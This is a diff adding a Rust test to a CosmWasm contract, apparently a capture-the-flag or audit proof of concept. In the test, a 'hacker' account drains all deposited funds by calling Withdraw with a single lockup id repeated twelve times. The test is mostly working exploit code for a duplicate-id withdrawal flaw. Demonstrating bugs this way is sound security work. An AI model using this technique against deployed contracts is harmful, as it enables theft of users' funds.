@@ -105,4 +105,61 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
     }
+
+    #[test]
+    fn theres_so_many() {
+        // "user" now has a lockup with id of 1 and amount of Uint128(10000)
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // create "hacker"
+        let hacker = Addr::unchecked("hacker");
+        // mint "hacker" Uint128(10000) coins
+        app = mint_tokens(app, hacker.to_string().clone(), Uint128::from(10000u128));
+        // "hacker" creates a lockup with their coins (id of 2)
+        app.execute_contract(
+            hacker.clone(),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
+        )
+        .unwrap();
+
+        // Verify hacker has no funds
+        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
+        assert_eq!(hacker_balance, Uint128::zero());
+
+        // Verify lockup exists
+        let hacker_lockup: Lockup = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetLockup { id: 2 })
+            .unwrap();
+        assert_eq!(hacker_lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
+        assert_eq!(hacker_lockup.owner, hacker);
+
+        // fast forward 24 hrs
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EXPLOIT HERE
+        // Notice the duplicate ids in Withdraw message
+        // 1 for the funds the hacker deposited,
+        // 1 for the funds the non-malicious user deposited
+        // 10 for the rest of the funds the contract has
+        app.execute_contract(
+            hacker.clone(),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw { ids: vec![2; 12] },
+            &[]
+        ).unwrap();
+
+        // Verify hacker has drained contract
+        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
+        assert_eq!(hacker_balance, Uint128::from(120000u128));
+
+        // Verify contract has no funds
+        let contract_balance = app.wrap().query_balance(contract_addr.to_string(), DENOM).unwrap().amount;
+        assert_eq!(contract_balance, Uint128::zero());
+    }
+    
 }
